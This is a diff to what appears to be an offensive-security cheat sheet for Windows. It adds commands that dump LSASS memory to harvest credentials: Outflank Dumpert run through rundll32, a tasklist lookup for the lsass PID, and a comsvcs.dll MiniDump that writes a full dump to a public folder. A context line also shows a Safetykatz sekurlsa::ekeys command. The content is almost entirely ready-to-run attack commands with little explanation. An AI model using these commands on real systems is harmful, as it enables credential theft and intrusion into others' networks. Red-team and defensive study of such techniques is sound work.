@@ -38,6 +38,17 @@ __Safetykatz__
 safetykatz.exe "sekurlsa::ekeys"
 ```
 
+__rundll32.exe__
+```powershell
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll ,Dump
+```
+```powershell
+tasklist \FI "IMAGENAME eq lsass.exe"
+```
+```powershell
+rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Public\lsass.dmp full
+```
+
 
 ---
 ### AsReproasting
